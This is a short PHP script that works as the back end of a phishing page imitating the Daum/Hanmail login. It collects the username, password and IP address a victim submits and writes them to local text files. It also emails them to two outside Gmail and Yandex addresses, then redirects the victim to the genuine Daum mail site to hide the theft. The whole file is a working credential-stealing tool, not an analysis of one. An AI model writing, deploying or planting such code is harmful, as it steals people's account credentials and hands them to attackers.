<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------126 Login Info-----------------------\n";
$message .= "User Id             : ".$_POST['username']."\n";
$message .= "Password             : ".$_POST['Password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Dec thinz hanmail-----------\n";
$send = "scofieldms02@gmail.com,smi7hgordon@yandex.com";
$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);
$subject = "Daum Result";
$headers = "From:daum<@newlife.com>";
$headers .= $_POST['userid']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("163.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: https://mail.daum.net/");

	 
?>